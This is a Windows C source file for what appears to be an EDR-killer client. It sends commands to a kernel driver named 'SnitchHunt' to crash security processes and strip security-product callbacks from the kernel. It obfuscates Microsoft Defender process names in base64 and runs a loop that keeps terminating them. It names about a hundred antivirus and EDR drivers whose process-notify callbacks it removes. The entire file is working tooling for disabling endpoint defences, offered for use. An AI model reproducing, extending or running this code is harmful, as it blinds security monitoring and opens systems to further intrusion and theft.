
#include <windows.h>
#include <stdio.h>
#include <DbgHelp.h>
#include <tchar.h>
#include <tlhelp32.h>
#include <wincrypt.h>

// Link with required libraries
#pragma comment (lib, "Crypt32.lib")
#pragma comment (lib, "Dbghelp.lib")



int stop_term_thread = 0;


// IOCTL base codes
#define SYSTEM_DRV 0x8000
#define IOCTL_BASE 0x800

// Helper macro to define our custom IOCTLs
#define CTL_CODE_HIDE(i) \
    CTL_CODE(SYSTEM_DRV, IOCTL_BASE + i, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Define custom IOCTL to instruct driver to crash target process
#define IOCTL_CRASH CTL_CODE_HIDE(1)
#define IOCTL_REM_PROC_CALLBACK CTL_CODE_HIDE(2)
#define IOCTL_LIST_PROC_CALLBACK CTL_CODE_HIDE(3)
#pragma warning (disable: 4996)

#define _CRT_SECURE_NO_WARNINGS


struct ModulesData {
    CHAR ModuleName[256];
    ULONG64 ModuleBase;
};

//struct ModulesDataNode {
//    ModulesData Data;
//    ModulesDataNode* Next;
//};

struct ModulesDataArray {
    ModulesData* Modules;
    SIZE_T Count;
};

const char* edrNames[] = {
"U2Vuc2VJUi5leGU=",                       // SenseIR.exe
"U2VjSGVhbHRoVUkuZXhl",                  // SecHealthUI.exe
"TXBEZWZlbmRlckNvcmVTZXJ2aWNlLmV4ZQ==",  // MpDefenderCoreService.exe
"c21hcnRzY3JlZW4uZXhl",                  // smartscreen.exe
"TXNNcEVuZy5leGU=",                      // MsMpEng.exe
"U2VjdXJpdHlIZWFsdGhTZXJ2aWNlLmV4ZQ==",  // SecurityHealthService.exe
"U2VjdXJpdHlIZWFsdGhTeXN0cmF5LmV4ZQ==",  // SecurityHealthSystray.exe
"TXNTZW5zZS5leGU=",                      // MsSense.exe
"U2Vuc2VOZHIuZXhl",                      // SenseNdr.exe
"U2Vuc2VUVk0uZXhl",                      // SenseTVM.exe
"TmlzU3J2LmV4ZQ=="                       // NisSrv.exe
};


// Array of driver names to monitor
const char* monitoredDrivers[] = {
    "EX64.sys", "Eng64.sys", "teefer2.sys", "teefer3.sys", "srtsp64.sys",
    "srtspx64.sys", "srtspl64.sys", "Ironx64.sys", "fekern.sys", "cbk7.sys",
    "WdFilter.sys", "cbstream.sys", "atrsdfw.sys", "avgtpx86.sys",
    "avgtpx64.sys", "naswSP.sys", "ProcessSnitch.sys", "edrsensor.sys", "CarbonBlackK.sys",
    "parity.sys", "csacentr.sys", "csaenh.sys", "csareg.sys", "csascr.sys",
    "csaav.sys", "csaam.sys", "rvsavd.sys", "cfrmd.sys", "cmdccav.sys",
    "cmdguard.sys", "CmdMnEfs.sys", "MyDLPMF.sys", "im.sys", "csagent.sys",
    "CybKernelTracker.sys", "CRExecPrev.sys", "CyOptics.sys", "CyProtectDrv32.sys",
    "CyProtectDrv64.sys", "groundling32.sys", "groundling64.sys", "esensor.sys",
    "edevmon.sys", "ehdrv.sys", "FeKern.sys", "WFP_MRT.sys", "xfsgk.sys",
    "fsatp.sys", "fshs.sys", "HexisFSMonitor.sys", "klifks.sys", "klifaa.sys",
    "Klifsm.sys", "mbamwatchdog.sys", "mfeaskm.sys", "mfencfilter.sys",
    "PSINPROC.SYS", "PSINFILE.SYS", "amfsm.sys", "amm8660.sys", "amm6460.sys",
    "eaw.sys", "SAFE-Agent.sys", "SentinelMonitor.sys", "SAVOnAccess.sys",
    "savonaccess.sys", "sld.sys", "pgpwdefs.sys", "GEProtection.sys",
    "diflt.sys", "sysMon.sys", "ssrfsf.sys", "emxdrv2.sys", "reghook.sys",
    "spbbcdrv.sys", "bhdrvx86.sys", "bhdrvx64.sys", "symevent.sys", "vxfsrep.sys",
    "VirtFile.sys", "SymAFR.sys", "symefasi.sys", "symefa.sys", "symefa64.sys",
    "SymHsm.sys", "evmf.sys", "GEFCMP.sys", "VFSEnc.sys", "pgpfs.sys",
    "fencry.sys", "symrg.sys", "ndgdmk.sys", "ssfmonm.sys", "SISIPSFileFilter.sys",
    "cyverak.sys", "cyvrfsfd.sys", "cyvrmtgn.sys", "tdevflt.sys", "tedrdrv.sys",
	"tedrpers.sys", "telam.sys", "cyvrlpc.sys", "MpKslf8d86dba.sys", "mssecflt.sys"
};


BOOL Terminate(HANDLE, DWORD);
DWORD FindProcessId(const char*);
char* base64_decode(const char*);
void killer_callback(HANDLE);


// Find PID of a process by its executable name
DWORD FindProcessId(const char* processName) {

    // Convert process name to wide char for comparison
    size_t wcharCount = mbstowcs(NULL, processName, 0) + 1;
    wchar_t* wprocessName = (wchar_t*)malloc(wcharCount * sizeof(wchar_t));
    if (!wprocessName) {
        return 0;
    }
    mbstowcs(wprocessName, processName, wcharCount);

    DWORD processId = 0;

    // Take a snapshot of all running processes
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 processEntry;
        processEntry.dwSize = sizeof(PROCESSENTRY32);

        // Iterate through all processes to find a match
        if (Process32First(snapshot, &processEntry)) {
            do {
                if (wcscmp(processEntry.szExeFile, wprocessName) == 0) {
                    processId = processEntry.th32ProcessID;
                    break;
                }
            } while (Process32Next(snapshot, &processEntry));
        }
        CloseHandle(snapshot);
    }

    free(wprocessName);
    return processId;
}


// Decode Base64 encoded process name
char* base64_decode(const char* input) {
    DWORD decodedSize = 0;

    // First, get the size of decoded output
    if (!CryptStringToBinaryA(input, 0, CRYPT_STRING_BASE64, NULL, &decodedSize, NULL, NULL)) {
        fprintf(stderr, "Failed to calculate Base64 decoded size.\n");
        return NULL;
    }

    BYTE* decoded = (BYTE*)malloc(decodedSize);
    if (decoded == NULL) {
        fprintf(stderr, "Memory allocation failed.\n");
        return NULL;
    }

    // Decode Base64 string into raw bytes
    if (!CryptStringToBinaryA(input, 0, CRYPT_STRING_BASE64, decoded, &decodedSize, NULL, NULL)) {
        fprintf(stderr, "Failed to decode Base64.\n");
        free(decoded);
        return NULL;
    }

    // Convert raw bytes to C string
    char* decodedStr = (char*)malloc(decodedSize + 1);
    if (decodedStr == NULL) {
        fprintf(stderr, "Memory allocation failed.\n");
        free(decoded);
        return NULL;
    }
    memcpy(decodedStr, decoded, decodedSize);
    decodedStr[decodedSize] = '\0';

    free(decoded);
    return decodedStr;
}



BOOL Terminate(HANDLE hDevice, DWORD pid) {
    DWORD bytesReturned;
    BOOL result = DeviceIoControl(
        hDevice,
        IOCTL_CRASH,
        &pid,
        sizeof(pid),
        NULL,
        0,
        &bytesReturned,
        NULL);
    return result;
}


void killer_callback(HANDLE hDevice) {
	int edrCount = sizeof(edrNames) / sizeof(edrNames[0]);

    while (!stop_term_thread) {
        for (size_t i = 0; i < edrCount; i++) {
            char* decodedName = base64_decode(edrNames[i]);
            if (decodedName) {
                DWORD pid = FindProcessId(decodedName);
                if (pid != 0) {
                    printf("Found EDR process: %s with PID %lu\n", decodedName, pid);
                    DWORD bytesReturned;
					BOOL result = Terminate(hDevice, pid);
                    if (result) {
                        printf("Sent crash command to process %s (PID %lu)\n", decodedName, pid);
                    }
                    else {
                        fprintf(stderr, "Failed to send crash command. Error: %lu\n", GetLastError());
                    }
                }
                free(decodedName);
            }
        }
    }
}

BOOL ListProcNotifyRoutine(HANDLE hDevice) {
    DWORD bytesReturned;
	ModulesData* resultArray = NULL;
	ULONG64 modulesCount = 0;
	BOOL result;



	resultArray = (ModulesData*)malloc(sizeof(ModulesData) * 64);

    result = DeviceIoControl(
		hDevice,
        IOCTL_LIST_PROC_CALLBACK,
        NULL,
        0,
		resultArray,
        sizeof(ModulesData) * 64,
		&bytesReturned,
        NULL
	);
	if (resultArray == NULL) {
        fprintf(stderr, "DeviceIoControl failed. Error: %lu\n", GetLastError());
        free(resultArray);
        return FALSE;
	}
    if (bytesReturned == 0) {
        fprintf(stderr, "No data returned from driver.\n");
        free(resultArray);
        return FALSE;
	}
    for (size_t i = 0; i < 64; i++) {
        if (resultArray[i].ModuleBase == 0)
			break;
        printf("Process Notify Callback %zu: %s at base address 0x%llx\n", i, resultArray[i].ModuleName, resultArray[i].ModuleBase);
	}

    return result;
}

BOOL ElProcCallback(HANDLE hDevice) {
    DWORD bytesReturned;
    ModulesData* resultArray = NULL;
    ULONG64 modulesCount = 0;
    BOOL result;



    resultArray = (ModulesData*)malloc(sizeof(ModulesData) * 64);

    result = DeviceIoControl(
        hDevice,
		IOCTL_LIST_PROC_CALLBACK,
        NULL,
        0,
        resultArray,
        sizeof(ModulesData) * 64,
        &bytesReturned,
        NULL
    );
    if (resultArray == NULL) {
        fprintf(stderr, "DeviceIoControl failed. Error: %lu\n", GetLastError());
        free(resultArray);
        return FALSE;
    }
    if (bytesReturned == 0) {
        fprintf(stderr, "No data returned from driver.\n");
        free(resultArray);
        return FALSE;
    }
    for (size_t i = 0; i < 64; i++) {
        if (resultArray[i].ModuleBase == 0)
            break;
		// Check if the module is in the monitored drivers list 104 is a temp number of the elements of the array
        for (size_t j = 0; j < 104; j++) {
            if (_stricmp(resultArray[i].ModuleName, monitoredDrivers[j]) == 0) {
                printf("Removing Process Notify Callback %s at base address 0x%llx\n", resultArray[i].ModuleName, resultArray[i].ModuleBase);
                DWORD bytesReturnedRem;
                BOOL remResult = DeviceIoControl(
                    hDevice,
                    IOCTL_REM_PROC_CALLBACK,
                    &resultArray[i].ModuleName,
                    sizeof(resultArray[i].ModuleName),
                    NULL,
                    0,
                    &bytesReturnedRem,
                    NULL
                );
                if (remResult) {
                    printf("Successfully removed callback for %s\n", resultArray[i].ModuleName);
                }
                else {
                    fprintf(stderr, "Failed to remove callback for %s. Error: %lu\n", resultArray[i].ModuleName, GetLastError());
                }
            }
		}
        printf("Process Notify Callback %zu: %s at base address 0x%llx\n", i, resultArray[i].ModuleName, resultArray[i].ModuleBase);
    }
    if (!result) {
        fprintf(stderr, "DeviceIoControl failed. Error: %lu\n", GetLastError());
    }
    else {
        printf("Successfully sent request to remove process notify routine callback.\n");
	}

    return result;
}





int main(int argc, char* argv[])
{
    HANDLE hDevice = CreateFileA(
        "\\\\.\\SnitchHunt",                // Device name
        GENERIC_READ | GENERIC_WRITE,      // Desired access
        0,                                  // Share mode
        NULL,                               // Security attributes
        OPEN_EXISTING,                      // Creation disposition
        FILE_ATTRIBUTE_NORMAL,              // Flags and attributes
		NULL);                              // Template file

    const size_t edrCount = sizeof(edrNames) / sizeof(edrNames[0]);
    HANDLE hTerminateThread;


    while (1) {
		char input[256];

		printf("> ");

		fgets(input, sizeof(input), stdin);
        if (strncmp(input, "terminate", 9) == 0) {
			stop_term_thread = 0;
            hTerminateThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)killer_callback, hDevice, 0, NULL);
            if (hTerminateThread == NULL) {
                fprintf(stderr, "Failed to create termination thread. Error: %lu\n", GetLastError());
                return 1;
			}
        }
        else if (strncmp(input, "exit", 4) == 0) {
            printf("Exiting...\n");
            break;
        }
        else if (strncmp(input, "stopterm", 8) == 0) {
            printf("Stopping termination...\n");
			stop_term_thread = 1;            
        }
		else if (strncmp(input, "listproc", 8) == 0) {
			ListProcNotifyRoutine(hDevice);
		}
        else if (strncmp(input, "kill", 4) == 0) {
            DWORD pid = atoi(input + 5);
            if (pid == 0) {
                printf("Invalid PID.\n");
                continue;
            }
            BOOL result = Terminate(hDevice, pid);
            if (result) {
                printf("Sent crash command to process with PID %lu\n", pid);
            }
            else {
                printf("Failed to send crash command. Error: %lu\n", GetLastError());
            }
		}
		else if (strncmp(input, "elproccallback", 14) == 0) {
			BOOL result = ElProcCallback(hDevice);
		    if (result) {
                printf("Sent request to eliminate process notify routine callback.\n");
            }
            else {
                printf("Failed to send request. Error: %lu\n", GetLastError());
			}
        }
        else if (strncmp(input, "help", 4) == 0) {
			printf("Help menu:\n");
			printf(" - terminate        - Start killing EDR processes\n");
			printf(" - kill <PID>       - Kill a specific process by PID\n");
			printf(" - exit             - Exit the program\n");
			printf(" - stopterm         - Stop killing EDR processes\n");
			printf(" - elproccallback   - Eliminate process notify routine callback\n");
			printf(" - listproc         - List process notify routines\n");
			printf(" - help             - Show this help menu\n");
        }
        else {
            printf("Unknown command. Available commands: kill, exit\n");
		}
    }
	return 0;
}